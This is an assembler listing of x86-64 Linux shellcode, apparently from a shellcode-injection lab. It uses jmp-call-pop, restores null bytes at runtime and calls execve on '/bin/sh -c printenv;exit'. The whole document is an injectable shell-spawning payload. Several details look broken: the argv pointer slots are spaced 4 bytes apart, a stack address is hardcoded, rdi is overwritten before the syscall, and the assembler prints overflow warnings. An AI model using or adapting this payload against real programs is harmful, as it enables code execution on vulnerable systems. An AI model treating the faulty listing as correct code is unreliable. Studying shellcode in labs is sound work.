     1                                            bits 64
     2                                              ; find out where we are
     3 00000000 EB62                    start:     jmp short codeEnd
     4 00000002 5E                      start2:    pop rsi
     5                                              ; clear the a register
     6 00000003 B800000000                         mov rax,0x0
     7                                              ; restore null bytes to data
     8 00000008 884607                             mov [byte rsi+flagStr-exeStr-2],al
     9 0000000B 88460B                             mov [byte rsi+cmdStr-exeStr-1],al
    10 0000000E 884619                             mov [byte rsi+arrayAddr-exeStr-1],al
    11 00000011 48894632                           mov [byte rsi+arrayAddr-exeStr+24],rax
    12                                             
    13                                              ; restore argv
    14                                              
    15 00000015 4889761A                           mov [byte rsi + arrayAddr - exeStr],rsi
    16 00000019 488D7E09                           lea rdi,[byte rsi + flagStr - exeStr] 
    17 0000001D 48897E1E                           mov [byte rsi + arrayAddr - exeStr + 4],rdi
    18 00000021 488D7E0C                           lea rdi, [byte rsi + cmdStr - exeStr]
    19 00000025 48897E22                           mov [byte rsi + arrayAddr - exeStr + 8],rdi
    20                                  
    21                                              ; execve system call
    22 00000029 B03B                               mov al,0x3b
    23 0000002B 48BF-                              mov rdi,exeStr
    23 0000002D [6900000000000000] 
    24 00000035 48BE-                              mov rsi,arrayAddr
    24 00000037 [8300000000000000] 
    25 0000003F 4889E2                             mov rdx,rsp
    26 00000042 48C1EA20                           shr rdx,32
    27 00000046 48C1E220                           shl rdx,32
    28 0000004A 488B0C25C056FBF7                   mov rcx,[0x7ffff7fb56c0]
    28          ******************       warning: dword data exceeds bounds [-w+number-overflow]
    28          ******************       warning: dword data exceeds bounds [-w+number-overflow]
    29 00000052 4809CA                             or  rdx,rcx
    30 00000055 488D3A                             lea rdi,[rdx]
    31 00000058 0F05                               syscall
    32                                  
    33                                              ; exit system call
    34 0000005A 4889C7                             mov rdi,rax
    35 0000005D 4831C0                             xor rax,rax
    36 00000060 B03C                               mov al,0x3c
    37 00000062 0F05                               syscall
    38                                  
    39 00000064 E899FFFFFF              codeEnd:   call start2
    40                                              ; data
    41 00000069 2F62696E2F73685879      exeStr:    db "/bin/shXy"
    42 00000072 2D6358                  flagStr:   db "-cX"
    43 00000075 7072696E74656E763B-     cmdStr:    db "printenv;exitX"
    43 0000007E 6578697458         
    44 00000083 FFFFFFFFFFFFFFFF        arrayAddr: dq 0xffffffffffffffff
    45 0000008B FFFFFFFFFFFFFFFF                   dq 0xffffffffffffffff
    46 00000093 FFFFFFFFFFFFFFFF                   dq 0xffffffffffffffff
    47 0000009B FFFFFFFFFFFFFFFF                   dq 0xffffffffffffffff
    48 000000A3 A3000000                newAddr: dd newAddr-start
